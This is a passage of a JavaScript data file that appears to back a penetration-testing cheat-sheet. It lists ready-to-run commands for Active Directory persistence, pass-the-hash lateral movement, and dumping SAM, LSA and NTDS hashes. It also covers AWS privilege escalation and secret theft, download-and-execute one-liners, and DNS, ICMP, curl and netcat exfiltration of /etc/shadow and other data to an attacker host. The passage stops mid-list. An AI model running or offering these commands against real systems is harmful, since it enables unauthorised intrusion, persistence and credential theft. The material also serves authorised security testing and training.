          { title: "AdminSDHolder Persistence", cmd: "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' -PrincipalIdentity <USER> -Rights All", tags: ["advanced"], desc: "Add ACL to AdminSDHolder for persistent domain admin access", note: "SDProp propagates permissions to all protected groups every 60 min" },
          { title: "LAPS Abuse (CrackMapExec)", cmd: "crackmapexec ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --module laps", tags: ["essential"], desc: "Dump LAPS passwords for all computers if authorized" },
          { title: "Shadow Credentials Attack", cmd: "python3 pywhisker.py -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET_COMPUTER>$ --action add --dc-ip <DC_IP>", tags: ["advanced"], desc: "Add shadow credentials to a computer object for PKINIT auth" },
          { title: "DPAPI Master Key Extraction", cmd: "impacket-dpapi backupkeys -t <DC_IP> -u <USER> -p <PASS>", tags: ["advanced"], desc: "Extract DPAPI backup keys from the domain controller" },
          { title: "Group Policy Abuse (SharpGPOAbuse)", cmd: "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName \"Default Domain Policy\"", tags: ["advanced"], desc: "Abuse writable GPO to add user as local admin on target machines" }
        ]
      }
    ]
  },

  // ─── 16. Lateral Movement Techniques ───
  {
    id: "lateral-move",
    name: "Lateral Movement Techniques",
    icon: "↔️",
    description: "Move laterally across the network using remote execution and Windows protocols",
    subcategories: [
      {
        name: "Impacket Execution",
        commands: [
          { title: "Impacket PsExec (Password)", cmd: "impacket-psexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>", tags: ["essential"], desc: "Remote shell via SMB service creation — returns SYSTEM" },
          { title: "Impacket PsExec (Hash)", cmd: "impacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>", tags: ["essential"], desc: "PsExec with Pass the Hash authentication" },
          { title: "Impacket WMIExec", cmd: "impacket-wmiexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>", tags: ["essential"], desc: "Semi-interactive shell via WMI — runs as user, less noisy" },
          { title: "Impacket SMBExec", cmd: "impacket-smbexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>", tags: ["essential"], desc: "Shell via SMB — similar to PsExec but different implementation" },
          { title: "Impacket AtExec", cmd: "impacket-atexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP> 'whoami'", tags: ["tool"], desc: "Execute command via Task Scheduler service" },
          { title: "Impacket DCOMExec", cmd: "impacket-dcomexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>", tags: ["tool"], desc: "Shell via DCOM (MMC20, ShellWindows, ShellBrowserWindow)" },
          { title: "Impacket DCOMExec (Specific Object)", cmd: "impacket-dcomexec -object MMC20 '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>", tags: ["advanced"], desc: "Specify the DCOM object to use for execution" },
          { title: "Impacket PsExec (Kerberos)", cmd: "export KRB5CCNAME=<USER>.ccache && impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_HOSTNAME>", tags: ["advanced"], desc: "PsExec using Kerberos ticket authentication" }
        ]
      },
      {
        name: "WinRM & PowerShell Remoting",
        commands: [
          { title: "Evil-WinRM (Password)", cmd: "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'", tags: ["essential"], desc: "Interactive PowerShell shell via WinRM with password" },
          { title: "Evil-WinRM (Hash)", cmd: "evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>", tags: ["essential"], desc: "WinRM shell with Pass the Hash" },
          { title: "Evil-WinRM (Key-Based)", cmd: "evil-winrm -i <TARGET_IP> -c certificate.pem -k private_key.pem -S", tags: ["advanced"], desc: "WinRM shell with certificate-based authentication" },
          { title: "Evil-WinRM Upload File", cmd: "upload /local/path/file.exe C:\\Temp\\file.exe", tags: ["essential"], desc: "Upload a file to target via Evil-WinRM session" },
          { title: "Evil-WinRM Download File", cmd: "download C:\\Users\\<USER>\\Desktop\\flag.txt /local/path/", tags: ["essential"], desc: "Download a file from target via Evil-WinRM session" },
          { title: "Enter-PSSession (PowerShell)", cmd: "Enter-PSSession -ComputerName <TARGET_HOSTNAME> -Credential <DOMAIN>\\<USER>", tags: ["essential"], desc: "Interactive PowerShell remoting session" },
          { title: "Invoke-Command (Single Host)", cmd: "Invoke-Command -ComputerName <TARGET_HOSTNAME> -Credential $cred -ScriptBlock { whoami; hostname }", tags: ["essential"], desc: "Execute commands on a remote host via PS remoting" },
          { title: "Invoke-Command (Multiple Hosts)", cmd: "Invoke-Command -ComputerName @('<HOST1>','<HOST2>','<HOST3>') -Credential $cred -ScriptBlock { whoami }", tags: ["tool"], desc: "Execute commands on multiple remote hosts simultaneously" },
          { title: "New-PSSession Persistent", cmds: ["$session = New-PSSession -ComputerName <TARGET_HOSTNAME> -Credential $cred", "Enter-PSSession $session"], tags: ["tool"], desc: "Create and enter a persistent PowerShell remoting session" },
          { title: "WinRS Remote Command", cmd: "winrs -r:<TARGET_HOSTNAME> -u:<USER> -p:<PASS> \"whoami\"", tags: ["tool"], desc: "Execute command remotely via Windows Remote Shell" }
        ]
      },
      {
        name: "Windows Remote Services",
        commands: [
          { title: "PsExec.exe (Sysinternals)", cmd: "PsExec.exe \\\\<TARGET_IP> -u <DOMAIN>\\<USER> -p <PASS> -accepteula cmd.exe", tags: ["essential"], desc: "Remote execution using Sysinternals PsExec binary" },
          { title: "PsExec.exe as SYSTEM", cmd: "PsExec.exe \\\\<TARGET_IP> -u <DOMAIN>\\<USER> -p <PASS> -s -accepteula cmd.exe", tags: ["essential"], desc: "Run remote command as SYSTEM with PsExec" },
          { title: "Remote Service Creation (sc.exe)", cmds: ["sc \\\\<TARGET_IP> create remotesvc binpath= \"cmd.exe /c <COMMAND>\"", "sc \\\\<TARGET_IP> start remotesvc", "sc \\\\<TARGET_IP> delete remotesvc"], tags: ["advanced"], desc: "Create and start a remote service for command execution" },
          { title: "Remote Scheduled Task", cmds: ["schtasks /create /s <TARGET_IP> /u <USER> /p <PASS> /tn \"TaskName\" /tr \"cmd.exe /c <COMMAND>\" /sc once /st 00:00", "schtasks /run /s <TARGET_IP> /u <USER> /p <PASS> /tn \"TaskName\"", "schtasks /delete /s <TARGET_IP> /u <USER> /p <PASS> /tn \"TaskName\" /f"], tags: ["advanced"], desc: "Create, run, and clean up a remote scheduled task" },
          { title: "WMIC Remote Process Create", cmd: "wmic /node:<TARGET_IP> /user:<USER> /password:<PASS> process call create \"cmd.exe /c <COMMAND>\"", tags: ["tool"], desc: "Execute a remote process via WMI command line" },
          { title: "CrackMapExec Command Exec", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -x 'whoami'", tags: ["essential"], desc: "Execute command via SMB with CrackMapExec" },
          { title: "CrackMapExec PowerShell Exec", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -X 'Get-Process'", tags: ["essential"], desc: "Execute PowerShell command via SMB with CME" },
          { title: "CrackMapExec Dump SAM", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --sam", tags: ["essential"], desc: "Dump local SAM hashes from target via CME" },
          { title: "CrackMapExec Dump LSA", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --lsa", tags: ["tool"], desc: "Dump LSA secrets from target via CME" },
          { title: "CrackMapExec Dump NTDS", cmd: "crackmapexec smb <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --ntds", tags: ["essential"], desc: "Dump all domain hashes from NTDS.dit via CME" },
          { title: "Runas with Network Credentials", cmd: "runas /netonly /user:<DOMAIN>\\<USER> cmd.exe", tags: ["tool"], desc: "Spawn cmd.exe with alternate network credentials", note: "Only affects network authentication, not local" },
          { title: "SharpRDP Remote Desktop Exec", cmd: "SharpRDP.exe computername=<TARGET_IP> command=\"cmd.exe /c <COMMAND>\" username=<DOMAIN>\\<USER> password=<PASS>", tags: ["advanced"], desc: "Execute commands via RDP protocol without full GUI session" }
        ]
      },
      {
        name: "RDP Access",
        commands: [
          { title: "xfreerdp (Password)", cmd: "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /d:<DOMAIN> /dynamic-resolution +clipboard", tags: ["essential"], desc: "Connect via RDP with xfreerdp" },
          { title: "xfreerdp (Hash — Restricted Admin)", cmd: "xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<NTLM_HASH> /d:<DOMAIN> /dynamic-resolution", tags: ["advanced"], desc: "RDP Pass the Hash via Restricted Admin mode" },
          { title: "xfreerdp with Drive Sharing", cmd: "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /d:<DOMAIN> /drive:share,/tmp/share", tags: ["tool"], desc: "RDP connection with a shared local directory" },
          { title: "rdesktop", cmd: "rdesktop -u <USER> -p '<PASS>' -d <DOMAIN> <TARGET_IP>", tags: ["tool"], desc: "Connect via RDP with rdesktop" },
          { title: "Enable RDP Remotely", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -M rdp -o ACTION=enable", tags: ["advanced"], desc: "Enable RDP on a remote host via CrackMapExec" }
        ]
      },
      {
        name: "File Shares & Data Collection",
        commands: [
          { title: "Map Network Share", cmd: "net use Z: \\\\<TARGET_IP>\\<SHARE> /user:<DOMAIN>\\<USER> <PASS>", tags: ["essential"], desc: "Map a network share to a drive letter" },
          { title: "List Remote Shares", cmd: "net view \\\\<TARGET_IP>", tags: ["essential"], desc: "List available shares on a remote host" },
          { title: "Access Share via smbclient", cmd: "smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'", tags: ["essential"], desc: "Interactive SMB client to browse and transfer files" },
          { title: "CME Spider Shares", cmd: "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --spider C$ --depth 3 --pattern txt,xml,config,ini,ps1", tags: ["tool"], desc: "Spider remote shares for interesting files" },
          { title: "Impacket SMBClient", cmd: "impacket-smbclient '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>", tags: ["tool"], desc: "Interactive SMB client via impacket" },
          { title: "Copy File via SMB", cmd: "copy \\\\<TARGET_IP>\\C$\\Windows\\Temp\\output.txt C:\\Temp\\", tags: ["tool"], desc: "Copy files from remote share via Windows copy command" }
        ]
      }
    ]
  },

  // ─── 17. AWS Cloud Security Testing ───
  {
    id: "cloud-aws",
    name: "AWS Cloud Security Testing",
    icon: "☁️",
    description: "Enumerate and exploit AWS cloud services, IAM, S3, EC2, and more",
    subcategories: [
      {
        name: "Credential Configuration",
        commands: [
          { title: "Configure AWS CLI", cmd: "aws configure", tags: ["essential"], desc: "Set up AWS access key, secret key, region, and output format" },
          { title: "Set AWS Env Variables", cmds: ["export AWS_ACCESS_KEY_ID='<ACCESS_KEY>'", "export AWS_SECRET_ACCESS_KEY='<SECRET_KEY>'", "export AWS_DEFAULT_REGION='us-east-1'"], tags: ["essential"], desc: "Set AWS credentials via environment variables" },
          { title: "Set Session Token", cmd: "export AWS_SESSION_TOKEN='<SESSION_TOKEN>'", tags: ["tool"], desc: "Set temporary session token for assumed roles" },
          { title: "Verify Current Identity", cmd: "aws sts get-caller-identity", tags: ["essential"], desc: "Show the current AWS identity (account, ARN, user ID)" },
          { title: "Use Specific Profile", cmd: "aws sts get-caller-identity --profile <PROFILE_NAME>", tags: ["tool"], desc: "Verify identity for a specific named profile" },
          { title: "Assume IAM Role", cmd: "aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME> --role-session-name pentest", tags: ["essential"], desc: "Assume an IAM role and get temporary credentials" }
        ]
      },
      {
        name: "IAM Reconnaissance",
        commands: [
          { title: "List IAM Users", cmd: "aws iam list-users", tags: ["essential"], desc: "Enumerate all IAM users in the account" },
          { title: "List IAM Roles", cmd: "aws iam list-roles", tags: ["essential"], desc: "Enumerate all IAM roles in the account" },
          { title: "List IAM Groups", cmd: "aws iam list-groups", tags: ["essential"], desc: "Enumerate all IAM groups in the account" },
          { title: "List Managed Policies", cmd: "aws iam list-policies --only-attached", tags: ["essential"], desc: "List all attached managed policies" },
          { title: "Get User Inline Policy", cmd: "aws iam get-user-policy --user-name <USER> --policy-name <POLICY_NAME>", tags: ["tool"], desc: "Retrieve the contents of an inline user policy" },
          { title: "List Attached User Policies", cmd: "aws iam list-attached-user-policies --user-name <USER>", tags: ["essential"], desc: "List managed policies attached to a specific user" },
          { title: "List User Inline Policies", cmd: "aws iam list-user-policies --user-name <USER>", tags: ["tool"], desc: "List inline policies for a specific user" },
          { title: "Get Policy Version Detail", cmd: "aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id v1", tags: ["tool"], desc: "View the actual permissions in a managed policy version" },
          { title: "List Group Policies", cmd: "aws iam list-attached-group-policies --group-name <GROUP>", tags: ["tool"], desc: "List managed policies attached to a group" },
          { title: "List Role Policies", cmd: "aws iam list-attached-role-policies --role-name <ROLE>", tags: ["tool"], desc: "List managed policies attached to a role" },
          { title: "Get Access Key Info", cmd: "aws iam list-access-keys --user-name <USER>", tags: ["tool"], desc: "List access keys for a user" },
          { title: "Enumerate-IAM Script", cmd: "python3 enumerate-iam.py --access-key <ACCESS_KEY> --secret-key <SECRET_KEY>", tags: ["essential"], desc: "Brute force API permissions for the current identity" }
        ]
      },
      {
        name: "Storage & Compute Enumeration",
        commands: [
          { title: "List S3 Buckets", cmd: "aws s3 ls", tags: ["essential"], desc: "List all S3 buckets in the account" },
          { title: "List S3 Bucket Contents", cmd: "aws s3 ls s3://<BUCKET_NAME>/ --recursive", tags: ["essential"], desc: "Recursively list all objects in a bucket" },
          { title: "Download S3 Object", cmd: "aws s3 cp s3://<BUCKET_NAME>/<KEY> ./loot/", tags: ["essential"], desc: "Download a file from S3" },
          { title: "Sync S3 Bucket", cmd: "aws s3 sync s3://<BUCKET_NAME>/ ./loot/<BUCKET_NAME>/", tags: ["tool"], desc: "Download entire bucket contents" },
          { title: "Public S3 Access (No Auth)", cmd: "aws s3 ls s3://<BUCKET_NAME>/ --no-sign-request", tags: ["essential"], desc: "List bucket contents without authentication" },
          { title: "Get Bucket ACL", cmd: "aws s3api get-bucket-acl --bucket <BUCKET_NAME>", tags: ["tool"], desc: "Check the access control list of a bucket" },
          { title: "Get Bucket Policy", cmd: "aws s3api get-bucket-policy --bucket <BUCKET_NAME>", tags: ["tool"], desc: "Retrieve the bucket policy JSON" },
          { title: "Check Bucket Website", cmd: "aws s3api get-bucket-website --bucket <BUCKET_NAME>", tags: ["tool"], desc: "Check if bucket is configured as a static website" },
          { title: "Describe EC2 Instances", cmd: "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress,Tags[?Key==`Name`].Value|[0]]' --output table", tags: ["essential"], desc: "List all EC2 instances with key details" },
          { title: "Describe Security Groups", cmd: "aws ec2 describe-security-groups --query 'SecurityGroups[*].[GroupId,GroupName,IpPermissions]'", tags: ["essential"], desc: "Enumerate security group rules for open ports" },
          { title: "Describe VPCs", cmd: "aws ec2 describe-vpcs", tags: ["tool"], desc: "List all VPCs in the region" },
          { title: "Describe Subnets", cmd: "aws ec2 describe-subnets --query 'Subnets[*].[SubnetId,CidrBlock,AvailabilityZone,Tags[?Key==`Name`].Value|[0]]' --output table", tags: ["tool"], desc: "List all subnets with CIDR info" },
          { title: "Describe Snapshots (Own)", cmd: "aws ec2 describe-snapshots --owner-ids self", tags: ["essential"], desc: "List EBS snapshots owned by current account" },
          { title: "List Lambda Functions", cmd: "aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table", tags: ["essential"], desc: "List all Lambda functions with runtime info" },
          { title: "Get Lambda Function Code", cmd: "aws lambda get-function --function-name <FUNCTION_NAME>", tags: ["essential"], desc: "Get Lambda function details and download code URL" },
          { title: "Get Lambda Policy", cmd: "aws lambda get-policy --function-name <FUNCTION_NAME>", tags: ["tool"], desc: "Get resource-based policy for a Lambda function" },
          { title: "Describe RDS Instances", cmd: "aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,Endpoint.Address,PubliclyAccessible]' --output table", tags: ["essential"], desc: "List RDS database instances" },
          { title: "List EKS Clusters", cmd: "aws eks list-clusters", tags: ["tool"], desc: "List all EKS Kubernetes clusters" },
          { title: "List ECR Images", cmd: "aws ecr list-images --repository-name <REPO_NAME>", tags: ["tool"], desc: "List images in an ECR container registry" }
        ]
      },
      {
        name: "Secrets & Metadata",
        commands: [
          { title: "List Secrets Manager Secrets", cmd: "aws secretsmanager list-secrets", tags: ["essential"], desc: "List all secrets in AWS Secrets Manager" },
          { title: "Get Secret Value", cmd: "aws secretsmanager get-secret-value --secret-id <SECRET_NAME>", tags: ["essential"], desc: "Retrieve the actual secret value" },
          { title: "List SSM Parameters", cmd: "aws ssm describe-parameters", tags: ["essential"], desc: "List all SSM Parameter Store entries" },
          { title: "Get SSM Parameter (Decrypted)", cmd: "aws ssm get-parameter --name <PARAM_NAME> --with-decryption", tags: ["essential"], desc: "Get SSM parameter value including SecureString decryption" },
          { title: "IMDSv1 — Get Credentials", cmd: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>", tags: ["essential"], desc: "Retrieve IAM role credentials from EC2 instance metadata v1", note: "Only works from within an EC2 instance" },
          { title: "IMDSv2 — Get Token + Credentials", cmds: ["TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')", "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>"], tags: ["essential"], desc: "Retrieve credentials from IMDSv2 (token required)" },
          { title: "IMDS — List Available Roles", cmd: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/", tags: ["tool"], desc: "Discover IAM roles available on the instance" },
          { title: "EC2 User Data", cmd: "aws ec2 describe-instance-attribute --instance-id <INSTANCE_ID> --attribute userData --query 'UserData.Value' --output text | base64 -d", tags: ["essential"], desc: "Retrieve and decode EC2 instance user data (may contain secrets)" }
        ]
      },
      {
        name: "Privilege Escalation",
        commands: [
          { title: "Create Access Key for User", cmd: "aws iam create-access-key --user-name <USER>", tags: ["essential"], desc: "Create new access keys for a user (requires iam:CreateAccessKey)" },
          { title: "Attach Admin Policy to User", cmd: "aws iam attach-user-policy --user-name <USER> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", tags: ["essential"], desc: "Attach the AdministratorAccess policy to a user" },
          { title: "Put Inline Admin Policy", cmd: "aws iam put-user-policy --user-name <USER> --policy-name AdminPolicy --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'", tags: ["advanced"], desc: "Add an inline policy granting full access to a user" },
          { title: "Add User to Admin Group", cmd: "aws iam add-user-to-group --user-name <USER> --group-name <ADMIN_GROUP>", tags: ["tool"], desc: "Add user to a group with elevated permissions" },
          { title: "Update Lambda Code for Escalation", cmd: "aws lambda update-function-code --function-name <FUNCTION_NAME> --zip-file fileb://malicious.zip", tags: ["advanced"], desc: "Replace Lambda function code to escalate via its IAM role" },
          { title: "Create Login Profile", cmd: "aws iam create-login-profile --user-name <USER> --password '<PASS>' --no-password-reset-required", tags: ["advanced"], desc: "Create console login for a user that only had API access" }
        ]
      },
      {
        name: "Automated Tools",
        commands: [
          { title: "Pacu — Start Framework", cmd: "pacu", tags: ["essential"], desc: "Launch Pacu AWS exploitation framework" },
          { title: "Pacu — IAM Enum", cmd: "run iam__enum_permissions", tags: ["essential"], desc: "Enumerate permissions for the current Pacu session identity" },
          { title: "Pacu — Privesc Scan", cmd: "run iam__privesc_scan", tags: ["essential"], desc: "Scan for privilege escalation paths in IAM" },
          { title: "Pacu — Enum EC2", cmd: "run ec2__enum", tags: ["tool"], desc: "Enumerate EC2 instances and related resources" },
          { title: "Pacu — Enum S3", cmd: "run s3__enum", tags: ["tool"], desc: "Enumerate S3 buckets and their permissions" },
          { title: "Pacu — Enum Lambda", cmd: "run lambda__enum", tags: ["tool"], desc: "Enumerate Lambda functions and configurations" },
          { title: "ScoutSuite AWS Audit", cmd: "scout aws --profile <PROFILE_NAME>", tags: ["essential"], desc: "Run comprehensive AWS security audit with ScoutSuite" },
          { title: "Prowler AWS Audit", cmd: "prowler aws", tags: ["essential"], desc: "Run CIS benchmark and security best practices audit" },
          { title: "S3Scanner", cmd: "s3scanner scan --bucket-file bucket_names.txt", tags: ["tool"], desc: "Scan for misconfigured and public S3 buckets" },
          { title: "CloudMapper Visualization", cmd: "python3 cloudmapper.py collect --config config.json --account <ACCOUNT_NAME> && python3 cloudmapper.py prepare --config config.json --account <ACCOUNT_NAME>", tags: ["advanced"], desc: "Collect and visualize AWS network infrastructure" }
        ]
      }
    ]
  },

  // ─── 18. File Transfer Arsenal ───
  {
    id: "file-ops",
    name: "File Transfer Arsenal",
    icon: "📁",
    description: "Techniques for transferring files to and from targets across different protocols",
    subcategories: [
      {
        name: "Attacker-Side Hosting",
        commands: [
          { title: "Python3 HTTP Server", cmd: "python3 -m http.server 80", tags: ["essential"], desc: "Start a simple HTTP server on port 80" },
          { title: "Python2 HTTP Server", cmd: "python -m SimpleHTTPServer 80", tags: ["essential"], desc: "Start a Python 2 HTTP server on port 80" },
          { title: "PHP Built-in Server", cmd: "php -S 0.0.0.0:80", tags: ["tool"], desc: "Start a PHP development server for hosting files" },
          { title: "Ruby HTTP Server", cmd: "ruby -run -e httpd . -p 80", tags: ["tool"], desc: "Start a Ruby HTTP server in the current directory" },
          { title: "Busybox HTTP Server", cmd: "busybox httpd -f -p 80", tags: ["tool"], desc: "Lightweight HTTP server via busybox" },
          { title: "Python Upload Server", cmd: "python3 -m uploadserver 443 --server-certificate /path/to/cert.pem", tags: ["tool"], desc: "HTTP upload server for receiving files from target" },
          { title: "Impacket SMB Server (No Auth)", cmd: "impacket-smbserver share $(pwd) -smb2support", tags: ["essential"], desc: "Start an SMB server sharing the current directory" },
          { title: "Impacket SMB Server (With Auth)", cmd: "impacket-smbserver share $(pwd) -smb2support -username <USER> -password <PASS>", tags: ["essential"], desc: "SMB server with authentication required" },
          { title: "FTP Server (pyftpdlib)", cmd: "python3 -m pyftpdlib -p 21 -w", tags: ["tool"], desc: "Start a writable FTP server on port 21" },
          { title: "TFTP Server", cmd: "sudo atftpd --daemon --port 69 /tftp", tags: ["tool"], desc: "Start a TFTP server for simple file transfers" },
          { title: "Netcat Listener (Receive File)", cmd: "nc -lvnp <PORT> > received_file", tags: ["essential"], desc: "Listen for incoming file transfer via netcat" }
        ]
      },
      {
        name: "Linux Target Downloads",
        commands: [
          { title: "wget Download", cmd: "wget http://<ATTACKER_IP>/file -O /tmp/file", tags: ["essential"], desc: "Download file using wget" },
          { title: "curl Download", cmd: "curl http://<ATTACKER_IP>/file -o /tmp/file", tags: ["essential"], desc: "Download file using curl" },
          { title: "curl Execute in Memory", cmd: "curl http://<ATTACKER_IP>/script.sh | bash", tags: ["essential"], desc: "Download and execute script without writing to disk" },
          { title: "SCP Download", cmd: "scp <USER>@<ATTACKER_IP>:/path/to/file /tmp/file", tags: ["essential"], desc: "Secure copy from attacker machine" },
          { title: "SCP Upload to Attacker", cmd: "scp /path/to/file <USER>@<ATTACKER_IP>:/tmp/loot/", tags: ["essential"], desc: "Upload file from target to attacker" },
          { title: "SFTP Transfer", cmds: ["sftp <USER>@<ATTACKER_IP>", "get /path/to/file", "put /local/file /remote/path/"], tags: ["tool"], desc: "Interactive SFTP session for file transfers" },
          { title: "rsync Transfer", cmd: "rsync -avz <USER>@<ATTACKER_IP>:/path/to/file /tmp/file", tags: ["tool"], desc: "Efficient file synchronization via rsync" },
          { title: "Netcat Send File", cmd: "nc <ATTACKER_IP> <PORT> < /path/to/file", tags: ["essential"], desc: "Send a file to the attacker via netcat" },
          { title: "Socat File Transfer", cmd: "socat TCP4:<ATTACKER_IP>:<PORT> file:/tmp/file,create", tags: ["tool"], desc: "Download file via socat" },
          { title: "Bash /dev/tcp Download", cmd: "cat < /dev/tcp/<ATTACKER_IP>/<PORT> > /tmp/file", tags: ["advanced"], desc: "Download file using bash built-in /dev/tcp (no external tools)" },
          { title: "Wget Recursive Download", cmd: "wget -r -np http://<ATTACKER_IP>/share/", tags: ["tool"], desc: "Recursively download directory contents" }
        ]
      },
      {
        name: "Windows Target Downloads",
        commands: [
          { title: "certutil Download", cmd: "certutil -urlcache -split -f http://<ATTACKER_IP>/file.exe C:\\Temp\\file.exe", tags: ["essential"], desc: "Download file via certutil (LOLBin)" },
          { title: "PowerShell DownloadFile", cmd: "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/file.exe','C:\\Temp\\file.exe')\"", tags: ["essential"], desc: "Download file via .NET WebClient" },
          { title: "PowerShell Invoke-WebRequest", cmd: "powershell -c \"Invoke-WebRequest -Uri http://<ATTACKER_IP>/file.exe -OutFile C:\\Temp\\file.exe\"", tags: ["essential"], desc: "Download file via Invoke-WebRequest (IWR)" },
          { title: "PowerShell IEX (In-Memory)", cmd: "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/script.ps1')\"", tags: ["essential"], desc: "Download and execute PowerShell script in memory" },
          { title: "BitsAdmin Download", cmd: "bitsadmin /transfer job /download /priority high http://<ATTACKER_IP>/file.exe C:\\Temp\\file.exe", tags: ["essential"], desc: "Download file via BITS service" },
          { title: "Start-BitsTransfer", cmd: "powershell -c \"Start-BitsTransfer -Source http://<ATTACKER_IP>/file.exe -Destination C:\\Temp\\file.exe\"", tags: ["tool"], desc: "Download file via PowerShell BITS cmdlet" },
          { title: "Copy from SMB Share", cmd: "copy \\\\<ATTACKER_IP>\\share\\file.exe C:\\Temp\\file.exe", tags: ["essential"], desc: "Copy file from attacker's SMB share" },
          { title: "Net Use SMB Mount", cmds: ["net use Z: \\\\<ATTACKER_IP>\\share /user:<USER> <PASS>", "copy Z:\\file.exe C:\\Temp\\file.exe", "net use Z: /delete"], tags: ["essential"], desc: "Mount SMB share, copy file, and clean up" },
          { title: "PowerShell Upload (POST)", cmd: "powershell -c \"Invoke-WebRequest -Uri http://<ATTACKER_IP>/upload -Method POST -InFile C:\\Temp\\file.txt\"", tags: ["tool"], desc: "Upload file from target to attacker via HTTP POST" },
          { title: "Expand CAB File Transfer", cmd: "expand \\\\<ATTACKER_IP>\\share\\file.cab C:\\Temp\\file.exe", tags: ["advanced"], desc: "Use expand.exe to copy from remote share (LOLBin)" },
          { title: "Esentutl Copy", cmd: "esentutl.exe /y \\\\<ATTACKER_IP>\\share\\file.exe /d C:\\Temp\\file.exe /o", tags: ["advanced"], desc: "Use esentutl.exe for file copy (LOLBin)" },
          { title: "MakeCab + Expand", cmds: ["makecab C:\\Temp\\secret.txt C:\\Temp\\secret.cab", "# Transfer secret.cab to attacker", "expand secret.cab secret.txt"], tags: ["advanced"], desc: "Compress and transfer via CAB archive" },
          { title: "Certutil Base64 Encode", cmds: ["certutil -encode C:\\Temp\\file.exe C:\\Temp\\file.b64", "type C:\\Temp\\file.b64", "# On attacker: decode the base64"], tags: ["advanced"], desc: "Encode file as base64 for text-based exfil (LOLBin)" }
        ]
      },
      {
        name: "Exfiltration Techniques",
        commands: [
          { title: "Exfil via DNS (base64 chunks)", cmd: "cat /etc/passwd | base64 -w0 | fold -w 60 | while read line; do nslookup $line.<ATTACKER_DOMAIN>; done", tags: ["advanced"], desc: "Exfiltrate data through DNS queries" },
          { title: "Exfil via ICMP", cmd: "cat /etc/passwd | xxd -p -c 16 | while read line; do ping -c 1 -p $line <ATTACKER_IP>; done", tags: ["advanced"], desc: "Exfiltrate data embedded in ICMP packets" },
          { title: "Exfil via curl POST", cmd: "curl -X POST -d @/etc/shadow http://<ATTACKER_IP>:<PORT>/exfil", tags: ["tool"], desc: "Exfiltrate file contents via HTTP POST" },
          { title: "Exfil via Netcat", cmd: "tar czf - /path/to/data/ | nc <ATTACKER_IP> <PORT>", tags: ["essential"], desc: "Compress and exfiltrate directory via netcat" },
          { title: "Exfil via OpenSSL Encrypted", cmds: ["tar czf - /path/to/data/ | openssl enc -aes-256-cbc -pbkdf2 -pass pass:<PASSWORD> | nc <ATTACKER_IP> <PORT>", "# On attacker: nc -lvnp <PORT> | openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:<PASSWORD> | tar xzf -"], tags: ["advanced"], desc: "Encrypted exfiltration via OpenSSL and netcat" }
        ]
      },
      {
        name: "Encoding & Steganography Transfers",
        commands: [
          { title: "Base64 Encode (Linux)", cmd: "base64 -w0 file.bin > file.b64", tags: ["essential"], desc: "Encode a file to base64 for text-based transfer" },
          { title: "Base64 Decode (Linux)", cmd: "base64 -d file.b64 > file.bin", tags: ["essential"], desc: "Decode a base64 encoded file" },
          { title: "Base64 Encode (PowerShell)", cmd: "powershell -c \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Temp\\file.exe'))\"", tags: ["essential"], desc: "Base64 encode a file on Windows" },
          { title: "Base64 Decode (PowerShell)", cmd: "powershell -c \"[IO.File]::WriteAllBytes('C:\\Temp\\file.exe',[Convert]::FromBase64String('<BASE64_STRING>'))\"", tags: ["essential"], desc: "Base64 decode and write file on Windows" },
          { title: "xxd Hex Encode", cmd: "xxd -p file.bin > file.hex", tags: ["tool"], desc: "Convert file to hex representation for transfer" },
          { title: "xxd Hex Decode", cmd: "xxd -r -p file.hex > file.bin", tags: ["tool"], desc: "Reconstruct file from hex dump" },
